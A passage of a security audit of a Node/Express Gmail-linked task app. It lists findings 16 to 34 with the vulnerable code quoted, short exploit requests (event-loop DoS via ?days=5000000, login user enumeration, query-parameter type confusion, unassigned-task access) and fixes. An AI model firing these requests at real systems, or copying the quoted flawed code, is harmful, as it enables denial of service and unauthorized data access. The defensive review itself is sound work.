  description: z.string().max(20000).optional(),
  clientName: z.string().trim().min(1).max(200).optional(),
  notes: z.string().max(20000).optional(),
  deadline: z.coerce.date().optional(),
  status: z.enum(['Pending','Completed','Late']).optional(),
  priority: z.enum(['Low','Medium','High','Urgent']).optional(),
  assignedTo: z.string().regex(/^[0-9a-fA-F]{24}$/).nullable().optional(),
  isRecurring: z.boolean().optional(),
  recurrence: z.enum(['Daily','Weekly','Monthly']).nullable().optional()
});
// routes/taskRoutes.js
.put(protect, validate(updateTaskSchema), updateTask)
```

---

## 16. MEDIUM — `getEmailTimeline` `?days=` is unbounded: event-loop DoS

**File:** `server/controllers/reportsController.js:234-252`

**Vulnerable code:**
```js
const days = parseInt(req.query.days) || 14;
...
for (let i = days - 1; i >= 0; i--) {
  const d = new Date(now.getFullYear(), now.getMonth(), now.getDate() - i);
  ...
  const labelStr = d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });   // ICU formatting, per iteration
  dateMap[dateStr] = { count: 0, assignedCount: 0, label: labelStr };
  timelineDates.push(dateStr);
}
const startDate = new Date(now.getFullYear(), now.getMonth(), now.getDate() - (days - 1));
```

**Exploit:** `GET /api/reports/email-timeline?days=5000000` as any Admin or Head. The loop performs five million `new Date` constructions **and** five million `toLocaleDateString` calls (ICU, the expensive part), building a five-million-key object and array. Node is single-threaded: the entire API — every user, the Socket.io server, the cron callbacks — is frozen for the duration, and the process may OOM. `startDate` also winds back ~13,700 years, so the subsequent `Email.find` degrades into a full collection scan. The general limiter allows 300 requests per 15 min, far more than needed. There is no `authorizeRoles('Admin')` narrowing either — any Head can do it (`routes/reportsRoutes.js:25`).

**Fix:**
```js
const days = Math.min(Math.max(parseInt(req.query.days, 10) || 14, 1), 365);
```
and hoist the `Intl.DateTimeFormat` instance out of the loop. Better still, replace the JS loop with a MongoDB `$group` on `$dateToString`. Apply the same clamp discipline to every numeric query param.

---

## 17. MEDIUM — Employees can read and complete any **unassigned** task

**File:** `server/controllers/taskController.js:117` and `:149-165`

**Vulnerable code:**
```js
// taskController.js:117 — the `task.assignedTo &&` short-circuit lets null through
if (req.user.role === 'Employee' && task.assignedTo && task.assignedTo._id.toString() !== req.user._id.toString()) {
  return res.status(403).json({ message: 'Access denied. You can only access tasks assigned to you.' });
}
```
```js
// taskController.js:151 — same short-circuit on the write path
if (task.assignedTo && task.assignedTo.toString() !== req.user._id.toString()) {
  return res.status(403).json({ message: 'Access denied. You can only update your own tasks.' });
}
```

`Task.assignedTo` defaults to `null` (`models/Task.js:18-22`) and is actively set to `null` by `deleteUser` cascade cleanup (`userController.js:251`) and by `updateTask` when a Head clears the assignee (line 218).

**Exploit:** `GET /api/tasks/<unassignedTaskId>` as an Employee returns the task **with its populated `linkedEmail` including `body` and `attachments`** (line 109) — the exact confidential content the role is supposed to be walled off from. `PUT /api/tasks/<unassignedTaskId> {"status":"Completed"}` then marks it done, fires a completion notification and an email to the creator (lines 173-181), and spawns a recurrence (line 189). Ids are enumerable via the `getComments`/`addComment` 404-vs-403 oracle.

Note the same expression written correctly with `?.` in `commentController.js:15` (`task.assignedTo?.toString() !== ...`) *does* deny the null case — the codebase is inconsistent with itself, which is a good sign this is an oversight rather than intent.

**Fix:**
```js
if (req.user.role === 'Employee' && task.assignedTo?.toString() !== req.user._id.toString()) {
  return res.status(403).json({ message: 'Access denied.' });
}
```
in both `getTaskById` and `updateTask` (deny-by-default: no assignee means no Employee access).

---

## 18. MEDIUM — `uncaughtException` handler keeps a corrupted process alive; DB failure is swallowed

**Files:** `server/index.js:116-122`, `server/config/db.js:28-31`

**Vulnerable code:**
```js
// index.js:116-122
process.on('unhandledRejection', (reason, promise) => {
  console.error('[UNHANDLED REJECTION]', reason);
});
process.on('uncaughtException', (err) => {
  console.error('[UNCAUGHT EXCEPTION]', err);      // ← swallowed, process continues
});
```
```js
// config/db.js:28-31
} catch (error) {
  console.error(`MongoDB Connection Error: ${error.message}`);
  // Log the error but do not crash the process, allowing server health check to run
}
```

**Failure scenario:** After an uncaught exception Node's state is undefined — a half-finished `user.save()` may hold an open transaction, a socket may be half-written, a `finally` may never run. Swallowing it and continuing to serve traffic converts a fail-fast crash into silent data corruption that is far harder to diagnose. Likewise, when Mongo is unreachable, `connectDB` returns normally, `server.listen` succeeds, `/api/health` cheerfully reports `"Server is running"`, and every real request hangs for Mongoose's 10 s buffer timeout before returning 500. Health checks and orchestrators see a healthy pod that serves nothing.

**Fix:**
```js
process.on('uncaughtException', (err) => {
  console.error('[UNCAUGHT EXCEPTION]', err);
  server.close(() => process.exit(1));
  setTimeout(() => process.exit(1), 10000).unref();   // hard stop
});
```
Do the same for `unhandledRejection`. Let a supervisor (pm2/systemd/k8s) restart. In `connectDB`, either `process.exit(1)` on failure or track a `dbReady` flag that `/api/health` reports as unhealthy.

---

## 19. MEDIUM — Recurrence: month-overflow, double-spawn race, and spawn-before-save

**Files:** `server/utils/recurrenceHelper.js:4-11` and `:13-34`, `server/controllers/taskController.js:187-190` and `:228-235`

**Vulnerable code:**
```js
// recurrenceHelper.js:4-11
const getNextDeadline = (currentDeadline, recurrence) => {
  const base = currentDeadline ? new Date(currentDeadline) : new Date();
  const next = new Date(base);
  if (recurrence === 'Daily') next.setDate(next.getDate() + 1);
  else if (recurrence === 'Weekly') next.setDate(next.getDate() + 7);
  else if (recurrence === 'Monthly') next.setMonth(next.getMonth() + 1);
  return next;
};
```

**(a) Month overflow.** `new Date(2026,0,31).setMonth(1)` yields **3 March**, not 28 February — `setMonth` normalizes the overflow. A monthly task due the 29th/30th/31st drifts forward every cycle: Jan 31 → Mar 3 → Apr 3 → May 3. Fix:
```js
else if (recurrence === 'Monthly') {
  const day = next.getDate();
  next.setDate(1);
  next.setMonth(next.getMonth() + 1);
  next.setDate(Math.min(day, new Date(next.getFullYear(), next.getMonth() + 1, 0).getDate()));
}
```

**(b) Double-spawn race.** In `taskController.js`:
```js
// :164-189 (Employee branch)
const wasAlreadyCompleted = task.status === 'Completed';
task.status = 'Completed';
if (!wasAlreadyCompleted) { ... await spawnNextRecurrence(task, io); }
...
// :235 — the guard's own state is only persisted AFTER the spawn
const updatedTask = await task.save();
```
The read-check-write is not atomic and the write happens *after* the side effect. Two concurrent `PUT /api/tasks/:id {"status":"Completed"}` (a double-clicked button is enough) both read `status === 'Pending'`, both pass the guard, and both create a next occurrence — duplicated tasks, duplicated notifications, duplicated completion emails to the creator. Fix with a conditional update:
```js
const claimed = await Task.findOneAndUpdate(
  { _id: req.params.id, status: { $ne: 'Completed' } },
  { $set: { status: 'Completed' } },
  { new: true }
);
if (claimed) { await spawnNextRecurrence(claimed, io); }
```

**(c) Spawn before save.** If `task.save()` at line 235 throws (validation, connection loss), the successor task has already been persisted and the assignee already notified, while the original stays `Pending` — the recurrence chain forks. Reorder so the state change is durable before any side effect, or wrap both in a transaction.

**(d) Silent failure.** `spawnNextRecurrence` catches everything and logs only `err.message` (line 48), returning `undefined`; the caller ignores the result. A broken recurrence chain is invisible.

---

## 20. MEDIUM — Audit gaps: user create/update/delete and all client CRUD are unlogged

**Files:** `server/controllers/userController.js` (grep confirms `logActivity` is used **only** at line 376, in `changePassword`), `server/controllers/clientController.js` (no import at all)

**Failure scenario:** The single most security-relevant action in the system — `PUT /api/users/:id {"role":"Admin"}` or `{"status":"Rejected"}` — writes **no** `ActivityLog` entry. Neither does `POST /api/users` (account creation) nor `DELETE /api/users/:id`, which cascades through seven collections (`userController.js:249-265`) and permanently deletes the target's notifications, activity logs, comments and keyword rules. After an Admin-account compromise there is no trail of what was changed. Note the irony: `deleteUser` runs `ActivityLog.deleteMany({ userId })` — the audit trail is itself a deletion target with no tamper-evidence.

`clientController.js` (`createClient`/`updateClient`/`deleteClient`, Admin+Head) logs nothing either, while the parallel implementations in `taskController.js:401/443/463` do — the two client CRUD surfaces are inconsistent (see also finding 25).

**Fix:** Add `logActivity` to `createUser`, `updateUser` (recording the before/after `role` and `status`), `deleteUser`, and all of `clientController`. Move `ActivityLog` to an append-only collection that user deletion does not purge, and add pagination to `getActivityLogs` (`userController.js:279-281` returns the entire collection unbounded).

---

## 21. MEDIUM — `express-mongo-sanitize` on `req.query` is a no-op under Express 5

**File:** `server/index.js:40-46`

**Vulnerable code:**
```js
app.use((req, res, next) => {
  if (req.body) mongoSanitize.sanitize(req.body);
  if (req.params) mongoSanitize.sanitize(req.params);
  if (req.headers) mongoSanitize.sanitize(req.headers);
  if (req.query) mongoSanitize.sanitize(req.query);      // ← sanitizes a throwaway object
  next();
});
```

In Express 5, `req.query` is a **getter that re-parses `req.url` on every access** (`node_modules/express/lib/request.js:217-227`) and returns a brand-new object each time. `sanitize()` mutates in place, so the mutation is discarded the moment anything reads `req.query` again.

**Proof (Express 5.2.1 + express-mongo-sanitize 2.x, project's own modules):**
```
GET /t?userId[$ne]=null
req.query after sanitize middleware: {"userId[$ne]":"null"}       ← the $ key survived
```
Body sanitization *does* work: `sanitize({a:1,'$ne':2,'b.c':3})` → `{"a":1}`.

**Actual exploitability — deliberately not overstated.** Express 5 defaults to the **simple** query parser (`querystring`), which cannot produce nested objects or `$`-prefixed keys — `?userId[$ne]=null` becomes the flat string key `"userId[$ne]"`. So operator injection through the query string is **not** currently reachable. What *is* reachable is type confusion, because repeated params still yield arrays:
- `GET /api/gmail/emails?q=a&q=b` → `q` is an array → `q.trim()` is `undefined` → TypeError → 500 (`gmailController.js:556`).
- `GET /api/reports/employee?userId=a&userId=b` → `userQuery._id = ['a','b']` → CastError → 500 (`reportsController.js:28`).

The real risk is the **latent** one: the protection everyone believes is in place is not, so the day someone sets `app.set('query parser', 'extended')` — or upgrades a dependency that does — `reportsController.js:28` (`userQuery._id = userId`) becomes a live NoSQL operator injection with no warning.

**Fix:** Reassign rather than mutate, and validate query params explicitly:
```js
app.use((req, res, next) => {
  if (req.body) req.body = mongoSanitize.sanitize(req.body);
  if (req.params) mongoSanitize.sanitize(req.params);
  const q = req.query;
  mongoSanitize.sanitize(q);
  Object.defineProperty(req, 'query', { value: q, writable: true, configurable: true });
  next();
});
```
and add a `validateQuery(schema)` middleware mirroring `validate` for every route that reads `req.query` (`/api/reports/employee`, `/api/reports/email-timeline`, `/api/gmail/emails`, `/api/gmail/auth-url`).

---

## 22. MEDIUM — User enumeration on login and forgot-password

**File:** `server/controllers/authController.js:107-115`, `:167-168` + `:218`

**Vulnerable code:**
```js
const user = await User.findOne({ email: emailNormalized }).select('+password');
if (!user) {
  return res.status(400).json({ message: 'Invalid credentials. User not found.' });      // ← distinct message
}
const isMatch = await bcrypt.compare(password, user.password);
if (!isMatch) {
  return res.status(400).json({ message: 'Invalid credentials. Incorrect password.' });  // ← distinct message
}
```

**Exploit:** `POST /api/auth/login {"email":"target@corp.com","password":"x"}` — `"User not found."` vs `"Incorrect password."` confirms account existence. 10 attempts per 15 min per IP still enumerates a 200-person org from a modest proxy pool, and the harvested list feeds finding 14's lockout DoS. The status messages at lines 119 and 122 further leak that an account is `Pending` or `Rejected`.

`forgotPassword` gets the *message* right (identical response at lines 168 and 221) but leaks through **timing**: the non-existent branch returns immediately, while the existing branch runs `bcrypt.genSalt(10)` + `bcrypt.hash` + an SMTP round-trip — hundreds of milliseconds of difference, trivially measurable.

**Fix:** Return one message for both login branches — `'Invalid email or password.'` — and always run a dummy `bcrypt.compare` against a fixed hash when the user is absent, so timing matches. Make forgot-password enqueue the work asynchronously and return immediately in both branches. Add per-account (not just per-IP) throttling.

---

## 23. MEDIUM — No `trust proxy`: rate limiting collapses to a single shared bucket

**File:** `server/index.js:20-52` — `app.set('trust proxy', ...)` appears nowhere in the codebase.

**Failure scenario:** Behind any reverse proxy, load balancer or PaaS ingress (Render/Railway/Heroku/nginx), `req.ip` is the **proxy's** address for every request. `express-rate-limit`'s default key generator therefore returns the same key for all users:
- The `authLimiter` (10 requests / 15 min, `index.js:20-26`) is consumed globally — ten failed logins from anyone locks **every** employee out of `/api/auth/login` for 15 minutes. A trivial denial of service.
- Conversely, an attacker sharing that bucket with legitimate traffic gets brute-force protection that is effectively meaningless per-account.

express-rate-limit v7+ emits an `ERR_ERL_UNEXPECTED_X_FORWARDED_FOR` validation error when it sees `X-Forwarded-For` without `trust proxy` configured — so this will be loud in logs, but it is not currently addressed. (I could not test against the real deployment topology, so the *specific* proxy in use is **UNVERIFIED**; the missing configuration itself is confirmed by grep.)

**Fix:** `app.set('trust proxy', 1);` (or the exact hop count / `'loopback'` for your topology — never `true` blindly, which lets clients spoof `X-Forwarded-For` and bypass the limiter entirely). Add a per-account key on the auth limiter:
```js
keyGenerator: (req) => `${req.ip}:${(req.body?.email || '').toLowerCase()}`
```
Also note `/api/users/change-password` and `/api/gmail/oauth/callback` have only the 300/15-min general limiter.

---

## 24. MEDIUM — `ensureTaskForEmail` assigns a wrong client name to every unmatched email

**File:** `server/utils/taskHelper.js:23-37`

**Vulnerable code:**
```js
let clientName = 'General Client';
const clients = await Client.find({});
if (clients.length > 0) {
  const senderLower = (email.from || '').toLowerCase();
  const matchedClient = clients.find(c => {
    const allEmails = [c.email, ...(c.associatedEmails || [])].filter(Boolean).map(e => e.toLowerCase().trim());
    return allEmails.some(ce => senderLower.includes(ce));
  });
  if (matchedClient) { clientName = matchedClient.name; }
  else { clientName = clients[0].name; }        // ← arbitrary first client, not 'General Client'
}
```

**Failure scenario:** The `'General Client'` default is unreachable whenever any client exists. Every keyword-routed or approved email from an unrecognised sender is labelled with `clients[0].name` — with the shipped seed data (`seeders/clientSeeder.js:9`) that is **"Reliance Industries"**, and `Client.find({})` has no `.sort()`, so it is whatever MongoDB returns first and can change between calls. This directly corrupts `getClientStats` (`reportsController.js:202-210` counts tasks by exact `clientName` match) and `clientController.getClients` `taskCount` (line 20): one client's billing/workload figures absorb every unattributed task in the system. Reports are silently wrong, with no indication anything failed.

Secondary: `Client.find({})` runs on **every** email assignment (no cache), and `senderLower.includes(ce)` is a naive substring test — a client with `associatedEmails: ["a@b.c"]` matches `not-a@b.co.uk`.

**Fix:** Delete the `else` branch and keep `'General Client'`. Match on the parsed address (extract from `Name <addr>` and compare exactly, or match the domain deliberately) rather than `String.includes`. Cache the client list for the duration of a sync run.

---

## 25. MEDIUM — `GET /api/clients` loads every task and every email into memory, and is Employee-accessible

**File:** `server/controllers/clientController.js:10-45`; route `server/routes/clientRoutes.js:13` (`protect` only — all roles)

**Vulnerable code:**
```js
const clients = await Client.find().sort({ createdAt: -1 });
const tasks = await Task.find({}, 'clientName status');     // ← every task in the system
const emails = await Email.find({}, 'from');                // ← every email in the system
...
const mailCount = emails.filter((e) => { ... }).length;     // O(clients × emails) in JS
```

**Failure scenario:** Any authenticated user — including an Employee, and including an unapproved `Pending` self-registrant (finding 3) — triggers a full scan of the `tasks` and `emails` collections on every page load. At 50k emails that is a multi-megabyte fetch plus a nested JS filter per client on the single event-loop thread, repeated for each caller. It also leaks aggregate business intelligence (per-client mail volume and task counts across the whole company) to a role whose documented scope is "View assigned emails & tasks only".

Note this controller **duplicates** `taskController.getClients` / `createClient` / `updateClient` / `deleteClient` (`taskController.js:289-470`), mounted separately at `/api/tasks/clients`. The two implementations disagree on authorization (`POST /api/tasks/clients` is Admin-only; `POST /api/clients` allows Head) and on audit logging (finding 20) — an Admin-only control that a Head can route around.

**Fix:** Replace the in-memory joins with two `countDocuments`/aggregation pipelines scoped per client. Restrict the endpoint to `authorizeRoles('Admin','Head')`, or strip `taskCount`/`mailCount` for Employees. Delete one of the two duplicate client CRUD surfaces and standardise on Admin-only mutation.

---

## 26. MEDIUM — `decrypt()` fails open: returns the ciphertext as if it were a valid token

**File:** `server/utils/tokenCrypto.js:44-71`

**Vulnerable code:**
```js
const decrypt = (ciphertext) => {
  if (!ciphertext) return ciphertext;
  const parts = ciphertext.split(':');
  // If it doesn't look like iv:encrypted:authTag, it is probably plaintext (e.g. legacy token)
  if (parts.length !== 3) { return ciphertext; }
  try {
    ...
    return decrypted;
  } catch (err) {
    console.error('[CRYPTO ERROR] Decryption failed:', err.message);
    // Return original ciphertext to support fallback / debug, or throw error depending on strictness
    return ciphertext;                                    // ← fails open
  }
};
```

**Failure scenario:** If `TOKEN_ENCRYPTION_KEY` is rotated, mistyped, or missing in one environment, `getEncryptionKey()` throws inside the `try`, the catch returns the raw `iv:ct:tag` string, and it is handed to Google as an OAuth access token (`gmailController.js:298`, `:926`, `:1132`). The result is an opaque `invalid_credentials` from the Gmail API, buried in `syncUserEmails`'s per-account catch (`gmailController.js:474`), which logs and moves on. Email sync silently stops for every user and nobody is alerted — a key-management incident presents as "Gmail is a bit flaky today". The same fail-open masks GCM authentication-tag failures, which is precisely the tampering signal AEAD exists to raise.

The `parts.length !== 3` plaintext passthrough is also a permanent downgrade path: a token stored unencrypted (pre-migration, or written by a code path that skipped `encrypt`) keeps working forever, so `scripts/encryptExistingTokens.js` can never be verified as complete.

**Fix:** Throw on decryption failure and let callers handle it explicitly:
```js
} catch (err) {
  console.error('[CRYPTO ERROR] Decryption failed:', err.message);
  throw new Error('TOKEN_DECRYPT_FAILED');
}
```
Validate `TOKEN_ENCRYPTION_KEY` once at boot (fail fast if absent/wrong length). Add a version prefix (`v1:iv:ct:tag`) so plaintext is distinguishable from ciphertext by design, and remove the legacy passthrough once the migration script has been confirmed to have run.

---

## 27. LOW — `oauth2Client.on('tokens')` async handler → `ParallelSaveError` / unhandled rejection

**File:** `server/controllers/gmailController.js:301-316`

**Vulnerable code:**
```js
oauth2Client.on('tokens', async (newTokens) => {
  if (inboxEmail === user.gmailEmail) {
    if (newTokens.access_token) user.gmailAccessToken = encrypt(newTokens.access_token);
    ...
  } else {
    const acct = user.linkedGmailAccounts.find(a => a.gmailEmail === inboxEmail);
    ...
    user.markModified('linkedGmailAccounts');
  }
  await user.save();
});
```

**Failure scenario:** This is an `async` EventEmitter listener — nothing awaits it and nothing catches it, so any rejection from `user.save()` becomes an unhandled rejection (swallowed by `index.js:116`, finding 18). Two concrete triggers:
1. `syncUserEmails` (line 447) calls `syncAccountEmails` sequentially for the primary account **and each linked account**, all sharing the *same* mutable `user` document. If a token refresh fires while another `save()` is in flight, Mongoose raises `ParallelSaveError` and the **refreshed refresh-token is lost** — the account silently de-authorizes at the next expiry.
2. The listener is registered fresh on each `syncAccountEmails` call but `user` is a long-lived shared object across the whole sync run; a late-firing event can overwrite a newer token with a stale one.

**Fix:** Replace the shared-document mutation with a targeted atomic write, and never use an async listener:
```js
oauth2Client.on('tokens', (newTokens) => {
  const update = {};
  if (inboxEmail === user.gmailEmail) {
    if (newTokens.access_token) update.gmailAccessToken = encrypt(newTokens.access_token);
    if (newTokens.refresh_token) update.gmailRefreshToken = encrypt(newTokens.refresh_token);
    User.updateOne({ _id: user._id }, { $set: update }).catch(e => console.error('[TOKEN PERSIST]', e));
  } else {
    if (newTokens.access_token) update['linkedGmailAccounts.$.gmailAccessToken'] = encrypt(newTokens.access_token);
    if (newTokens.refresh_token) update['linkedGmailAccounts.$.gmailRefreshToken'] = encrypt(newTokens.refresh_token);
    User.updateOne({ _id: user._id, 'linkedGmailAccounts.gmailEmail': inboxEmail }, { $set: update })
      .catch(e => console.error('[TOKEN PERSIST]', e));
  }
});
```

**Related (same function, LOW):** `emailRecord.save()` at `gmailController.js:435` is not wrapped. `Email.messageId` is globally `unique` (`models/Email.js:4-8`), so if the same Gmail message id is ever ingested twice — the same mailbox connected by two MailDesk users, or a race between the manual `POST /api/gmail/fetch` and the 10-minute cron — the duplicate-key error propagates out of `syncAccountEmails` and aborts the **entire** sync loop for that account, leaving the remaining messages unfetched. Wrap the per-message body in try/catch and `continue` on `err.code === 11000`.

---

## 28. LOW — Startup cleanup mass-resets email assignment state on every boot

**File:** `server/config/db.js:16-27`

**Vulnerable code:**
```js
const tasks = await Task.find({ linkedEmail: { $ne: null } }).select('linkedEmail');
const linkedEmailIds = tasks.map(t => t.linkedEmail.toString());
const result = await Email.updateMany(
  { _id: { $nin: linkedEmailIds } },
  { status: 'unassigned', assignedTo: null }
);
```

**Failure scenario:** Every process start — including every nodemon reload in development and every deploy/restart/crash-loop in production — wipes `status` and `assignedTo` on **every email that has no linked Task**. Emails whose task was deleted (`taskController.deleteTask` nulls the link at line 269, `deleteAllEmails` nulls it at line 590) are silently un-assigned, so `approvalStatus: 'approved'` records revert to looking unassigned and reappear in queues. It also loads every linked email id into memory and ships them all as a `$nin` array — an unindexable operator over the full `emails` collection that grows linearly and will time out at scale.

There is a second-order interaction with finding 18: because `connectDB`'s catch swallows errors, a failure partway through this cleanup leaves the collection half-reset with only a console line to show for it.

**Fix:** Remove this from the connection path. Data repair belongs in an explicit, idempotent, logged migration script under `scripts/`, run deliberately — not on every boot. If a reconciliation job is genuinely needed, express it as a scoped aggregation (`$lookup` against tasks) and have it report before it writes.

---

## 29. LOW — Zod `errorMap` is ignored in v4, so custom messages never reach users

**File:** `server/middleware/schemas.js:25-27`, `:33-35`, `:36-38`, `:88-90`

**Vulnerable code:**
```js
role: z.enum(['Head', 'Employee'], {
  errorMap: () => ({ message: 'Invalid role selection. Must be Head or Employee.' })
})
```

**Proof (zod 4.4.3):** parsing `{a:'Z'}` against `z.enum(['X','Y'], {errorMap: () => ({message:'CUSTOM MSG'})})` yields
```
issues msg: Invalid option: expected one of "X"|"Y"
```
`errorMap` was replaced by the unified `error` parameter in Zod 4; the option is silently ignored. (Currently moot because finding 5 means no validation message reaches the client at all — but it will surface the moment `validate.js` is fixed, so repair both together.)

**Fix:** `z.enum(['Head','Employee'], { error: 'Invalid role selection. Must be Head or Employee.' })` — and likewise for the three other occurrences.

---

## 30. LOW — No pagination anywhere; `getEmails` returns every full HTML body

**Files:** `gmailController.js:572-575`, `taskController.js:89-93`, `userController.js:16` and `:279-281`, `notificationController.js:8-9`, `keywordRuleController.js:15-18` and `:174-177`, `clientController.js:12-14`

Every list endpoint returns an unbounded collection. The worst is:
```js
// gmailController.js:572
const emails = await Email.find(query)
  .populate('assignedTo', 'name email')
  .populate('fetchedBy', 'name email gmailEmail')
  .sort({ date: -1 });        // no .limit(), no .skip(), no field projection
```
`Email.body` holds complete HTML mail including base64 data-URI inline images inlined at `gmailController.js:376`. An Admin inbox of a few thousand messages produces a response of hundreds of megabytes, built entirely in memory. `getActivityLogs` similarly returns the whole log table with `.populate('userId', ...)`.

The `q` search (`gmailController.js:556-570`) is correctly regex-escaped via `escapeRegex` — no ReDoS — but it is unanchored and `subject`/`from` are unindexed for regex, so it is a full collection scan, and `q` has no length bound.

**Fix:** Add `?page`/`?limit` (validated, `limit` capped at ~100) with `.skip().limit()` across all list endpoints. Project `body` **out** of the inbox list and serve it only from a per-email detail endpoint. Cap `q` length. The README already advertises inbox pagination — this is the server side of that.

---

## 31. LOW — Password policy, bcrypt cost, and `Bearer` prefix matching

**Files:** `middleware/schemas.js:7`, `:24`, `:50`; `authController.js:40`; `userController.js:66`, `:369`; `authMiddleware.js:11-17`

- `z.string().min(6)` is the entire password policy — `123456` is accepted. No maximum either, so a 1 MB password reaches bcrypt (which truncates at 72 bytes but still costs the hash). **Fix:** `.min(12).max(128)` plus a breach-list check (`zxcvbn` or the HIBP k-anonymity API).
- `bcrypt.genSalt(10)` at three sites — cost 10 is below the current recommendation of 12+. **Fix:** centralise `const BCRYPT_ROUNDS = 12;` and use it everywhere.
- ```js
  // authMiddleware.js:11-17
  if (req.headers.authorization && req.headers.authorization.startsWith('Bearer')) {
    token = req.headers.authorization.split(' ')[1];
  ```
  `startsWith('Bearer')` (no trailing space) also matches `Bearerfoo`, and `.split(' ')[1]` is `undefined` for a header with no space — `jwt.verify(undefined, ...)` throws and is caught, so this is a correctness nit rather than a bypass. **Fix:** `startsWith('Bearer ')` and reject an empty token explicitly.
- `jwt.verify` is called without an `algorithms` option (`authMiddleware.js:20`, `index.js:149`, `gmailController.js:185`). jsonwebtoken v9 infers HS256/384/512 from a string secret and rejects `alg: none` unless the key is falsy, so there is **no** algorithm-confusion vulnerability today. Still, pin it defensively: `jwt.verify(token, secret, { algorithms: ['HS256'] })`.

---

## 32. LOW — Invalid HTTP status 550; AI endpoint is an unmetered LLM proxy

**File:** `server/controllers/aiController.js:44-46` and `:6-38`

```js
if (error.message?.includes('API_KEY')) {
  return res.status(550).json({ message: 'Invalid Gemini API key.' });
}
```
`550` is not a valid HTTP status code (it is an SMTP code). Clients, proxies and monitoring will treat it as an unclassified 5xx. **Fix:** use `502 Bad Gateway` (upstream misconfiguration) or `500`.

Separately, `summarizeEmail` takes `subject`, `from` and `body` **directly from the request body** rather than an email id, and there is no Zod schema on the route (`routes/aiRoutes.js:6`). Any authenticated Admin/Head can post arbitrary text and get Gemini output — an unmetered LLM proxy billed to the project's `GEMINI_API_KEY`. `body` is unbounded on input (only sliced to 3000 chars *after* the regex strip at line 24, so the regex itself runs over the full payload). **Fix:** accept an email `_id`, load and authorize it server-side, add a schema with `body: z.string().max(50000)`, and apply a dedicated per-user rate limiter.

---

## 33. LOW — Modulo bias in the temporary-password generator

**File:** `server/controllers/authController.js:172-180`

```js
const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$';   // 65 chars
const bytes = crypto.randomBytes(12);
let pass = '';
for (let i = 0; i < 12; i++) {
  pass += chars.charAt(bytes[i] % chars.length);
}
```
`256 % 65 = 61`, so the first 61 characters of the alphabet are ~1.6% more likely than the last 4. The source is `crypto.randomBytes`, so entropy is still roughly 12 × log₂(65) ≈ 72 bits — comfortably strong, and this is not practically attackable. Flagged for correctness only.

**Fix:** use rejection sampling, or `crypto.randomInt(0, chars.length)` per character. Better, apply finding 14 and stop generating passwords server-side altogether.

---

## 34. INFO — Secrets handling

Verified:
- `.env` **is** correctly ignored (`.gitignore:63` matches `server/.env`) and `git ls-files` shows only `server/.env.example` tracked. `git log --all -- server/.env` is empty — the file was never committed. Good.
- No hardcoded fallback secrets of the `process.env.JWT_SECRET || 'secret'` form anywhere. `getEncryptionKey()` throws when `TOKEN_ENCRYPTION_KEY` is missing (`tokenCrypto.js:9-11`) rather than defaulting — good.
- Gmail access/refresh tokens are `select: false` on the model (`models/User.js:27-51`) and I found no path that returns a raw token to a client. `getConnectedStatus` correctly maps to `connected: !!a.gmailAccessToken` booleans (`gmailController.js:645-651`).
- OAuth `state` is a 10-minute signed JWT bound to `userId` (`gmailController.js:149-153`) and verified on callback (`:185`) — genuine CSRF protection. `redirect_uri` comes from env, never from the request.

Concerns:
- Actual `JWT_SECRET` is **40 characters with only 23 distinct characters** and `OAUTH_STATE_SECRET` is 39 characters — both look human-authored rather than generated. For HS256, use ≥32 bytes of CSPRNG output: `node -e "console.log(require('crypto').randomBytes(48).toString('base64'))"`. `TOKEN_ENCRYPTION_KEY` is a correct 64-char hex (32 bytes).
- `getAuthUrl` falls back to `process.env.JWT_SECRET` when `OAUTH_STATE_SECRET` is unset (`gmailController.js:151`, `:185`). Both are set here, but the fallback means a session JWT and an OAuth state token would share a signing key — key separation is worth enforcing (throw at boot if `OAUTH_STATE_SECRET` is missing).
- No `.env.example` entry documents that `JWT_SECRET` must be high-entropy; add generation instructions alongside the existing `TOKEN_ENCRYPTION_KEY` comment.
- `SENDER_APP_PASSWORD` (a Gmail app password) sits in plaintext env and the nodemailer transporter is constructed at module load (`utils/emailHelper.js:5-11`). Consider a secrets manager for production.

---

## Additional smaller observations

- **No 404 handler.** Unmatched routes fall through to Express's default HTML 404, breaking the JSON contract the client expects.
- **Inconsistent response envelopes.** `clientController` returns `{success, data}` while every other controller returns bare arrays/objects or `{message}`. Pick one.
- **`createTask` recurrence normalization mismatch** (`taskController.js:35-36`): `isRecurring` is normalized (`=== true || === 'true'`) but the next line tests the **raw** value — `{"isRecurring":"false"}` stores `isRecurring: false` with a non-null `recurrence`. Use the normalized boolean in both places.
- **`bulkTaskAction` reports counts it did not verify** (`taskController.js:337`, `:347`, `:363`): `result = { deleted: taskIds.length }` reflects the input length, not `deleteMany`'s `deletedCount`. Non-existent ids inflate the number, and the same value is written to the audit log. Use the driver's actual result.
- **`bulkTaskSchema` arrays are unbounded** (`schemas.js:87`) and elements are unvalidated strings — a non-ObjectId member produces a CastError → 500. Add `.max(500)` and a `/^[0-9a-fA-F]{24}$/` regex; same for `bulkAssignEmailsSchema.emailIds`.
- **`fetchEmails` as Admin is unbounded work on a request thread** (`gmailController.js:501-517`): it iterates every user with a connected account and, per account, issues up to 150 sequential `messages.get` calls (plus one attachment fetch per inline image). One click can mean thousands of serial Google API calls in a single HTTP request — guaranteed gateway timeout and Gmail quota exhaustion. Move to a background job with a queue and return `202 Accepted`.
- **Overdue-notification storm** (`cronJobs.js:39-65`): for each overdue task the loop notifies the assignee **plus every Admin and Head**. The first run after a backlog builds up creates `tasks × supervisors` Notification documents and socket emits in one minute-long tick. Batch with `insertMany` and a single digest per supervisor.
- **`getEmployeeReport` windows are rolling, not calendar** (`reportsController.js:16-21`): `weekly` is "last 7 days" and the default is "last 30 days", but the README advertises "Weekly/monthly performance reports". A "monthly" report on 1 March covers 30 January onward. Also, tasks are filtered by `createdAt` rather than assignment or completion date, so a task assigned inside the window but created before it is invisible. Decide explicitly between rolling and calendar boundaries and document it.
- **`getClientStats` is O(clients × 3) sequential queries** (`reportsController.js:189-220`) — three `countDocuments` per client inside a `for` loop, each an unindexed case-insensitive regex over `clientName`. Replace with a single `$group` aggregation.
- **`escapeRegex` is correct** (`utils/regexHelper.js:8`) for the contexts it is used in — the unescaped `-` only matters inside a character class, and no call site builds one. No action needed; noted so it is not re-flagged.
